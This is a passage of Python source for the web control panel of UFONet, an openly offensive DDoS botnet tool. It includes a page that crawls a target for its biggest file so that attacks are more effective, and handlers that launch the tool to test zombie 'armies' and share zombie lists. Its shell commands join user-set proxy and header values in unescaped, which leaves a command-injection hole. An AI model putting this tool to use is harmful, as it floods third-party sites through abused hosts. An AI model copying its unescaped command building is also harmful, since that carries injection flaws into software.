      - a place; to efficiently hit your target</div> <div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Updating</a></div><div class="nb" id="nb4" style="display: none;">
  This feature can be used <u>ONLY</u> if you have cloned UFONet.

       - <i>git clone <a href="https://code.03c8.net/epsylon/ufonet" target="_blank">https://code.03c8.net/epsylon/ufonet</a></i>
       - <i>git clone <a href="https://github.com/epsylon/ufonet" target="_blank">https://github.com/epsylon/ufonet</a></i>
</div><div>
<a id="mH5" href="javascript:show('nb5');" style="text-decoration: none;" >+ FAQ/Issues?</a></div><div class="nb" id="nb5" style="display: none;">
  If you have problems with UFONet, try to solve them following next links:

      - <a href="https://ufonet.03c8.net/FAQ.html" target="_blank">Website FAQ</a> section
      - UFONet <a href="https://github.com/epsylon/ufonet/issues" target="_blank">issues</a></div>
<div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none;" >+ How can help?</a></div> <div class="nb" id="nb6" style="display: none;">      - Testing; use the tool and search for possible bugs and new ideas
      - Coding; you can try to develop more features
      - Promoting; talk about UFONet on the internet, events, hacklabs, etc
      - Donating; <a href="https://blockchain.info/address/19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw" target="_blank">bitcoin</a>, objects, support, love ;-)</div> <div><a id="mH7" href="javascript:show('nb7');" style="text-decoration: none" >+ Contact methods</a></div> <div class="nb" id="nb7" style="display: none;">  You can contact using:
   
      - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
      - <a target="_blank" href="wormhole">Wormhole</a>: irc.freenode.net / #ufonet
</div></td> </tr></table> </td></tr></table>
""" + self.pages["/footer"]

        self.pages["/inspect"] = self.pages["/header"] + """<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Abduction() {
        var win_requests = window.open("abduction","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Start(){
        target=document.getElementById("target").value
        String.prototype.startsWith = function(prefix){
        return this.indexOf(prefix) === 0;
        }
        if(target.startsWith("http")){
        params="target="+escape(target)

        }else{
          window.alert("You need to enter a valid url: http(s)://target.com/page.html");
          return
        }
        runCommandX("cmd_inspect",params)
}
</script>
</head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="38" cellspacing="38">
<tr>
 <td>
<div class="ringMenu">
<ul>
  <li class="main"><a href="inspect">Inspect</a></li>
  <li class="top"><a href="help">Help</a></li>
  <li class="right"><a href="botnet">Botnet</a></li>
  <li class="bottom"><a href="attack">Attack</a></li>
  <li class="left"><a href="gui">RETURN</a></li>
</ul>
</div>
 </td>
 <td>
	<table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
	<tr>
<td>
<pre>
  This feature will provide you the biggest file on target. 
  You can use this before to attack to be more effective.

  <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> 

<hr>
  * Set page to crawl: <input type="text" name="target" id="target" size="30" placeholder="http(s)://target.com/list_videos.php">

<hr>
   <button title="Start to search for biggest file on your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;">INSPECT!</button></pre>
</td><td><table><tr><td><img src='data:image/png;base64,"""+self.alien7_img+"""' onclick="Abduction()"></td></tr><tr><td align="right"><a href="javascript:Abduction()">ABDUCTION!</a></td></tr></table></td>
</tr></table>
 </td>
</tr>
</table>
<hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

        self.pages["/ranking"] = self.pages["/header"] + """<script language="javascript">
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Stats() {
        var win_stats = window.open("stats","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Links() {
        var win_links = window.open("links","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Streams() {
        var win_streams = window.open("streams","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Sync_ranking(){
    ranking_source=document.getElementById("ranking_source").value
    if(ranking_source == "") {
        window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
        return
    }else{
        params="ranking_source="+escape(ranking_source)
        runCommandX("cmd_refresh_ranking",params)
         document.getElementById("nb1").style.display = "none";
         document.getElementById("nb1").style.display = "block";
        setTimeout("location.reload()", 10000)
    }
  }
</script></head>
<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table bgcolor="black" cellpadding="24" cellspacing="25" border="0"><tr>
  <td><a href="javascript:alert('Commander DPR says: I love new blood!! """ + self.ranking + """, in the Ranking section you can see information about how to raise your grade, meet the best UFOMasters, be close to those who are like you and try to find partners to dominate the multi-verse... Until then: Dont be evil!');"><img src='data:image/png;base64,"""+self.commander_img+"""'></a></td>
  <td>GRADUATION/CLANS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit your own stats..." onclick="Stats()">VISIT STATS!</button><br><br><button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit TV.streams..." onclick="Streams()">VISIT STREAMS!</button></td>
</tr></table>
<table cellpadding="5" cellspacing="10">
<tr>
<td align="center">
 Your ranking is: <b>""" + str(self.ranking) + """</b>
 </td>
 </tr>
 <tr>
 <td>
<table border="1" cellpadding="10" cellspacing="10">
<tr>
 <td align="center"><b><u>GRADE:</u></b></td><td align="center"><b><u>RANKING:</u></b></td><td align="center"><b><u>REQUIRED:</u></b></td></tr>
<tr>
    <td align="center"><font color='orange' size='4'>-</font></td><td align="center"><font color='orange'>Unknown</font></td><td align='center'><a style="text-decoration:none" href="javascript:alert('You havent a correct key set on your configuration to unmask this Motherships!');">KEY?</a></td></tr>
 <tr>
 <td align="center"><font color='white' size='4'>*</font></td><td align="center"><font color='white'>Rookie</font></td><td align='center'><font color='white'>missions<4</font></td></tr>
 <tr>
 <td align="center"><font color='cyan' size='4'>**</font></td><td align="center"><font color='cyan'>Mercenary</font></td><td align='center'><font color='cyan'>missions>4</font></td></tr>
 <tr>
  <td align="center"><font color='blueviolet' size='4'>***</font></td><td align="center"><font color='blueviolet'>Bandit</font></td><td align='center'><font color='blueviolet'>crashed=1</font></td></tr>
 <tr>
   <td align="center"><font color='blue' size='4'>****</font></td><td align="center"><font color='blue'>UFOmmander!</font></td><td align='center'><font color='blue'>crashed>1<4</font></td></tr>
 <tr>
    <td align="center"><font color='red' size='4'>&#x25BC;</font></td><td align="center"><font color='red'>UFOl33t!</font></td><td align='center'><font color='red'><a style="text-decoration:none" href="javascript:alert('Secret Achievement!');">???</a></font></td></tr>
 </table>
 </td>
 </tr></table>
<br>
<table cellpadding="5" cellspacing="10">
 <tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="ranking_source" id="ranking_source" size="20" value='"""+default_blackhole+"""'></td>
<td><button title="Syncronize data from a blackhole with your device..." onclick="Sync_ranking()">DOWNLOAD!</button></td>
</tr></table>
<br>
<div id="nb2" style="display: none;">"""+str(self.extract_ranking_table())+"""</div>
Last update: <font color='"""+ self.ranking_status_color + """'>"""+ self.ranking_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.ranking_text+"""</div>
<table bgcolor="black" cellpadding="5" cellspacing="10" border="0"><tr>
 <td>
</td><td>
<table border="1" cellpadding="5" cellspacing="10">
<tr>
 <td align="center"><b><u>TOTAL_ON_GRID:</u></b></td><td align="center"><b><u>"""+str(self.ranking_grid_total)+"""</u></b></td></tr>
 <tr>
 <td align="center"><font color='orange'>Unknown</font></td><td align='center'><font color='orange'>"""+str(self.ranking_grid_unknown)+"""</font></td></tr>
  <tr>
 <td align="center"><font color='white'>Rookie</font></td><td align='center'><font color='white'>"""+str(self.ranking_grid_rookie)+"""</font></td></tr>
  <tr>
 <td align="center"><font color='cyan'>Mercenary</font></td><td align='center'><font color='cyan'>"""+str(self.ranking_grid_mercenary)+"""</font></td></tr>
  <tr>
 <td align="center"><font color='blueviolet'>Bandit</font></td><td align='center'><font color='blueviolet'>"""+str(self.ranking_grid_bandit)+"""</font></td></tr>
  <tr>
 <td align="center"><font color='blue'>UFOmmander!</font></td><td align='center'><font color='blue'>"""+str(self.ranking_grid_ufommander)+"""</font></td></tr>
  <tr>
 <td align="center"><font color='red'>UFOl33t!</font></td><td align='center'><font color='red'>"""+str(self.ranking_grid_ufoleet)+"""</font></td></tr>
</table>
</td><td>
<table border="1" cellpadding="5" cellspacing="10">
<tr>
 <td><b><u>TOP_5_MOTHERSHIPS:</u></b></td></tr>
<tr>
<td align='center'>"""+str(self.ranking_top5_player1)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_top5_player2)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_top5_player3)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_top5_player4)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_top5_player5)+"""</td></tr>
</table>
</td><td>
<table border="1" cellpadding="5" cellspacing="10">
<tr>
 <td><b><u>RANDOM_SIMILAR:</u></b></td></tr>
<tr>
<td align='center'>"""+str(self.ranking_similar_player1)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_similar_player2)+"""</td></tr>
<tr>
<td align='center'>"""+str(self.ranking_similar_player3)+"""</td></tr>
</table>
</td><td>
<table border="1" cellpadding="5" cellspacing="10">
<tr>
 <td><b><u>AI_SUGGESTION:</u></b></td></tr>
<tr>
 <td align='center'>"""+str(self.ranking_top1_player1)+"""</td></tr>
</table>
</td>
</tr></table>
</center>
<hr>
""" + self.pages["/footer"]

        self.pages["/lib.js"] = """function loadXMLDoc() {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
                           document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                           setTimeout("loadXMLDoc()", 3000); 
                   }
                }
        }
        xmlhttp.send();
}
function runCommandX(cmd,params) {
        var xmlhttp;
        if (window.XMLHttpRequest) {
                // code for IE7+, Firefox, Chrome, Opera, Safari
                xmlhttp = new XMLHttpRequest();
        } else {
                // code for IE6, IE5
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4 ) {
                   if(xmlhttp.status == 200){
								if(cmd.indexOf("?")!=-1){
									s=cmd.split("?")
									cmd=s[0]
									params=s[1]
								}
                                document.getElementById("cmdOut").innerHTML = xmlhttp.responseText;
                                //document.getElementById("cmdOut").scrollIntoView();
                                newcmd=cmd
                                if(newcmd=="cmd_list_army"||newcmd=="cmd_view_army"||newcmd=="cmd_list_zombies"||newcmd=="cmd_list_aliens"|| newcmd=="cmd_list_droids"||newcmd=="cmd_list_ucavs"||newcmd=="cmd_list_rpcs"||newcmd=="cmd_view_changelog"){ //do not refresh listing army
                                    return;
                                } else {
                                if(newcmd=="cmd_test_army" || newcmd=="cmd_test_all" || newcmd=="cmd_test_offline" || newcmd=="cmd_test_rpcs" || newcmd=="cmd_attack" || newcmd=="cmd_refresh_blackholes" || newcmd=="cmd_refresh_news" || newcmd=="cmd_refresh_missions" || newcmd=="cmd_sync_grid" || newcmd=="cmd_sync_board" || newcmd=="cmd_sync_wargames" || newcmd=="cmd_sync_links" || newcmd=="cmd_sync_globalnet" || newcmd=="cmd_sync_streams" || newcmd=="cmd_send_message_board" || newcmd=="cmd_transfer_grid" || newcmd=="cmd_transfer_wargame" || newcmd=="cmd_transfer_link" || newcmd=="cmd_transfer_globalnet" || newcmd=="cmd_transfer_stream" || newcmd=="cmd_decrypt" || newcmd=="cmd_decrypt_moderator_board" || newcmd=="cmd_decrypt_grid" || newcmd=="cmd_decrypt_wargames" || newcmd=="cmd_decrypt_links" || newcmd=="cmd_decrypt_globalnet" || newcmd=="cmd_decrypt_streams" || newcmd=="cmd_inspect" || newcmd=="cmd_abduction" || newcmd=="cmd_download_community" || newcmd=="cmd_upload_community" || newcmd=="cmd_attack_me" || newcmd=="cmd_check_tool" || newcmd=="cmd_edit_supply" || newcmd=="cmd_job_remove" || newcmd=="cmd_job_remove_all" || newcmd=="cmd_job_add" || newcmd =="cmd_job_add_all" || newcmd=="cmd_job_cancel" || newcmd=="cmd_job_cancel_all" || newcmd=="cmd_job_filter" || newcmd=="cmd_link_filter" || newcmd=="cmd_globalnet_filter" || newcmd=="cmd_stream_filter" || newcmd=="cmd_grid_filter" || newcmd=="cmd_search") newcmd=newcmd+"_update"
								//do not refresh if certain text on response is found
								if(newcmd.match(/update/) && 
										(
								  xmlhttp.responseText.match(/Generating random exit/) ||
 								  xmlhttp.responseText.match(/Biggest File/) ||
                                                                  xmlhttp.responseText.match(/Abduction finished/) ||
								  xmlhttp.responseText.match(/Not any zombie active/) ||
     								  xmlhttp.responseText.match(/Target looks OFFLINE/) ||
                                                                  xmlhttp.responseText.match(/Unable to connect to target/) ||
                                                                  xmlhttp.responseText.match(/Something wrong/) ||
                                                                  xmlhttp.responseText.match(/Target url not valid/) ||
                                                                  xmlhttp.responseText.match(/updated/) ||
                                                                  xmlhttp.responseText.match(/For HELP use:/) ||
                                                                  xmlhttp.responseText.match(/Not any .git repository found/) ||
                                                                  xmlhttp.responseText.match(/End of /) ||
                                                                  xmlhttp.responseText.match(/Exiting /) ||
								  xmlhttp.responseText.match(/Bye/)
										) 
											) return;
                                setTimeout(function(){runCommandX(newcmd,params)}, 3000);
								return;}
                   }
                }
        }
		if(typeof params != "undefined") cmd=cmd+"?"+params
        xmlhttp.open("GET", cmd, true);
        xmlhttp.send();
}
"""
        self.pages["/requests"] = self.html_requests()
        self.pages["/board_profile"] = self.html_board_profile()
        self.pages["/grid_profile"] = self.html_grid_profile()

    def buildGetParams(self, request):
        params = {}
        try:
            path = re.findall("^GET ([^\s]+)", request.decode('utf-8'))
        except:
            path = re.findall("^GET ([^\s]+)", request)
        if path:
            path = path[0]
            start = path.find("?")
            if start != -1:
                if path[start+1:start+7] == "zombie":
                    params['zombie']=path[start+8:]
                    return params
                if path[start+1:start+7] == "target":
                    params['target']=path[start+8:]
                    return params
                for param in path[start+1:].split("&"):
                    f = param.split("=")
                    if len(f) == 2:
                        var = f[0]
                        value = f[1]
                        value = value.replace("+", " ")
                        value = urllib.parse.unquote(value)
                        params[var] = value
        return params

    def save_profile(self,pGet):
        # set values for profile configuration from html form to json file
        if "profile_token" in list(pGet.keys()):
            profile_token = pGet["profile_token"]
        else:
            profile_token = self.profile_token
        if "profile_icon" in list(pGet.keys()):
            profile_icon = pGet["profile_icon"]
        else:
            profile_icon = self.profile_icon
        if "profile_nick" in list(pGet.keys()):
            profile_nick = pGet["profile_nick"]
        else:
            profile_nick = self.profile_nick
        # set new values on boardcfg json file 
        with open(self.mothership_boardcfg_file, "w") as f:
            json.dump({"profile_token": profile_token, "profile_icon": profile_icon, "profile_nick": profile_nick}, f, indent=4)

    def save_grid(self,pGet):
        # set values for profile configuration from html form to json file
        if "grid_token" in list(pGet.keys()):
            grid_token = pGet["grid_token"]
        else:
            grid_token = self.grid_token
        if "grid_contact" in list(pGet.keys()):
            grid_contact = pGet["grid_contact"]
        else:
            grid_contact = self.grid_contact
        if "grid_nick" in list(pGet.keys()):
            grid_nick = pGet["grid_nick"]
        else:
            grid_nick = self.grid_nick
        # set new values on gridcfg json file 
        with open(self.mothership_gridcfg_file, "w") as f:
            json.dump({"grid_token": grid_token, "grid_contact": grid_contact, "grid_nick": grid_nick}, f, indent=4)

    def save_cfg(self,pGet):
        # set values for requests configuration from html form to json file
        if "rproxy" in list(pGet.keys()):
            frm_rproxy = pGet["rproxy"]
        else:
            frm_rproxy = self.rproxy
        if "ruseragent" in list(pGet.keys()):
            frm_ruseragent = pGet["ruseragent"]
        else:
            frm_ruseragent = self.ruseragent
        if "rreferer" in list(pGet.keys()):
            frm_rreferer = pGet["rreferer"]
        else:
            frm_rreferer = self.rreferer
        if "rhost" in list(pGet.keys()):
            frm_rhost = pGet["rhost"]
        else:
            frm_rhost = self.rhost
        if "rxforw" in list(pGet.keys()):
            frm_rxforw = pGet["rxforw"]
        else:
            if "update" in list(pGet.keys()):
                frm_rxforw = ""
            else:
                frm_rxforw = self.rxforw
        if "rxclient" in list(pGet.keys()):
            frm_rxclient = pGet["rxclient"]
        else:
            if "update" in list(pGet.keys()):
                frm_rxclient = ""
            else:
                frm_rxclient = self.rxclient
        if "rtimeout" in list(pGet.keys()):
            frm_rtimeout = pGet["rtimeout"]
        else:
            frm_rtimeout = self.rtimeout
        if "rretries" in list(pGet.keys()):
            frm_rretries = pGet["rretries"]
        else:
            frm_rretries = self.rretries
        if "rdelay" in list(pGet.keys()):
            frm_rdelay = pGet["rdelay"]
        else:
            frm_rdelay = self.rdelay
        if "threads" in list(pGet.keys()):
            frm_threads = pGet["threads"]
        else:
            frm_threads = self.threads
        if "rssl" in list(pGet.keys()):
            frm_rssl = pGet["rssl"]
        else:
            if "update" in list(pGet.keys()):
                frm_rssl = ""
            else:
                frm_rssl = self.rssl
        # set new values on webcfg json file 
        with open(self.mothership_webcfg_file, "w") as f:
            json.dump({"rproxy": frm_rproxy, "ruseragent": frm_ruseragent, "rreferer": frm_rreferer, "rhost": frm_rhost, "rxforw": frm_rxforw, "rxclient": frm_rxclient, "rtimeout": frm_rtimeout, "rretries": frm_rretries, "rdelay": frm_rdelay, "threads":frm_threads, "rssl":frm_rssl}, f, indent=4)

    def get(self, request):
        # set request options of the user
        cmd_options = "--proxy='" + self.rproxy + "' --user-agent='" + self.ruseragent + "' --referer='" + self.rreferer + "' --host='" + self.rhost + "' --timeout='" + self.rtimeout + "' --retries='" + self.rretries + "' --delay='" + self.rdelay +"'" + " --threads='"+self.threads+"'"
        if self.rxforw == "on":
            cmd_options = cmd_options + " --xforw"
        if self.rxclient == "on":
            cmd_options = cmd_options + " --xclient"
        if self.rssl == "on":
            cmd_options = cmd_options + " --force-ssl"
        cmd_options = cmd_options + " --force-yes" # no raw_input allowed on webgui
        runcmd = ""
        try:
            res = re.findall("^GET ([^\s]+)", request.decode('utf-8'))
        except:
            res = re.findall("^GET ([^\s]+)", request)
        if res is None or len(res)==0:
            return
        pGet = {}
        page = res[0]
        paramStart = page.find("?")
        if paramStart != -1:
            page = page[:paramStart]
            try:
                pGet = self.buildGetParams(request.decode('utf-8'))
            except:
                pGet = self.buildGetParams(request)
        if page.startswith("/js/") or page.startswith("/images/") or page.startswith("/maps/") or page.startswith("/markers/"):
            if os.path.exists("core/"+page[1:]):
                 try:
                     f=open("core/"+page[1:],'r',encoding="utf-8")
                     data = f.read()
                     self.pages[page]=data
                 except:
                     f=open("core/"+page[1:],'rb') # ajax map related
                     data = f.read()
                     self.pages[page]=data
            elif page == "/js/ajax.js":
                from .ajaxmap import AjaxMap
                self.pages[page] = AjaxMap().ajax(pGet)
        if page == "/cmd_check_tool":
            self.pages["/cmd_check_tool"] = "<pre>Waiting for updates results...</pre>"
            runcmd = "("+python_version+" -i ufonet --update |tee /tmp/out) &"
        if page == "/cmd_check_tool_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_check_tool_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_view_changelog":
           f = open("docs/VERSION", "r")
           changelog = f.read()
           f.close()
           self.pages["/cmd_view_changelog"] = "</center><pre>"+str(changelog)+"<br /><br/>"
        if page == "/cmd_list_army":
            self.pages["/cmd_list_army"] = "<pre><h1>Total Botnet = "+self.total_botnet+"</h1><table cellpadding='10' cellspacing='10' border='1'><tr><td>UCAVs:</td><td>"+self.num_ucavs+"</td><td>Aliens:</td><td>"+self.num_aliens+"</td></tr><tr><td>Droids:</td><td>"+self.num_droids+"</td><td>Zombies:</td><td>"+self.num_zombies+"</td></tr><tr><td>XML-RPCs:</td><td>"+self.num_rpcs+" </td><td>NTPs:</td><td>"+self.num_ntps+"</td></tr><tr><td>DNSs:</td><td>"+self.num_dnss+"</td><td>SNMPs:</td><td>"+self.num_snmps+"</td></tr></table> <hr><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>UCAVs:</u> <b>"+self.num_ucavs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ucavs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ucavs)+"</td><td></h3>"+'\n'.join(self.ucavs)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Aliens:</u> <b>"+self.num_aliens+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.aliens_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_aliens)+"</td><td></h3>"+'\n'.join(self.aliens)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Droids:</u> <b>"+self.num_droids+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.droids_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_droids)+"</td><td></h3>"+'\n'.join(self.droids)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>XML-RPCs:</u> <b>"+self.num_rpcs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.rpcs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_rpcs)+"</td><td></h3>"+'\n'.join(self.rpcs)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>NTPs:</u> <b>"+self.num_ntps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ntps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ntps)+"</td><td></h3>"+'\n'.join(self.ntps)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>DNSs:</u> <b>"+self.num_dnss+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.dnss_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_dnss)+"</td><td></h3>"+'\n'.join(self.dnss)+"</td></tr></table><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>SNMPs:</u> <b>"+self.num_snmps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.snmps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_snmps)+"</td><td></h3>"+'\n'.join(self.snmps)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_zombies":
            self.pages["/cmd_list_zombies"] = "<pre><h1>Total Zombies = "+self.num_zombies+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Zombies:</u> <b>"+self.num_zombies+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.zombies_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_zombies)+"</td><td></h3>"+'\n'.join(self.zombies)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_aliens":
            self.pages["/cmd_list_aliens"] = "<pre><h1>Total Aliens = "+self.num_aliens+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Aliens:</u> <b>"+self.num_aliens+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.aliens_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_aliens)+"</td><td></h3>"+'\n'.join(self.aliens)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_droids":
            self.pages["/cmd_list_droids"] = "<pre><h1>Total Droids = "+self.num_droids+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>Droids:</u> <b>"+self.num_droids+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.droids_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_droids)+"</td><td></h3>"+'\n'.join(self.droids)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_ucavs":
            self.pages["/cmd_list_ucavs"] = "<pre><h1>Total UCAVs = "+self.num_ucavs+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>UCAVs:</u> <b>"+self.num_ucavs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ucavs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ucavs)+"</td><td></h3>"+'\n'.join(self.ucavs)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_rpcs":
            self.pages["/cmd_list_rpcs"] = "<pre><h1>Total XML-RPCs = "+self.num_rpcs+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>XML-RPCs:</u> <b>"+self.num_rpcs+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.rpcs_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_rpcs)+"</td><td></h3>"+'\n'.join(self.rpcs)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_ntps":
            self.pages["/cmd_list_ntps"] = "<pre><h1>Total NTPs = "+self.num_ntps+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>NTPs:</u> <b>"+self.num_ntps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.ntps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_ntps)+"</td><td></h3>"+'\n'.join(self.ntps)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_dnss":
            self.pages["/cmd_list_dnss"] = "<pre><h1>Total DNSs = "+self.num_dnss+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>DNSs:</u> <b>"+self.num_dnss+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.dnss_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_dnss)+"</td><td></h3>"+'\n'.join(self.dnss)+"</td></tr></table><br /><br/>"
        if page == "/cmd_list_snmps":
            self.pages["/cmd_list_snmps"] = "<pre><h1>Total SNMPs = "+self.num_snmps+"</h1><br /><table border='1' cellpadding='10' cellspacing='10'><tr><td><h3><u>SNMPs:</u> <b>"+self.num_snmps+"</b></td><td>Last update: <u>"+time.ctime(os.path.getctime(self.snmps_file))+"</u></td></tr><tr><td>"+'\n'.join(self.list_snmps)+"</td><td></h3>"+'\n'.join(self.snmps)+"</td></tr></table><br /><br/>"
        if page == "/cmd_view_army":
            if pGet=={}:
                self.pages["/cmd_view_army"] = self.html_army_map()
        if page == "/cmd_view_attack":
            if 'target' in list(pGet.keys()) != None:
                self.pages["/cmd_view_attack"] = self.html_army_map(pGet['target'])
        if page == "/cmd_test_army":
            self.pages["/cmd_test_army"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "("+python_version+" -i ufonet -t " + self.zombies_file + " " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_all":
            self.pages["/cmd_test_all"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "("+python_version+" -i ufonet --test-all " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_test_offline":
            self.pages["/cmd_test_offline"] = "<pre>Waiting for testing results...</pre>"
            runcmd = "("+python_version+" -i ufonet --test-offline " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me":
            self.pages["/cmd_attack_me"] = "<pre>Waiting for 'attack-me' results...</pre>"
            runcmd = "("+python_version+" -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_attack_me_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_download_community":
            self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
            runcmd = "("+python_version+" -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_download_community_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_upload_community":
            self.pages["/cmd_upload_community"] = "<pre>Waiting for uploading results...</pre>"
            runcmd = "("+python_version+" -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
        if page == "/cmd_upload_community_update":
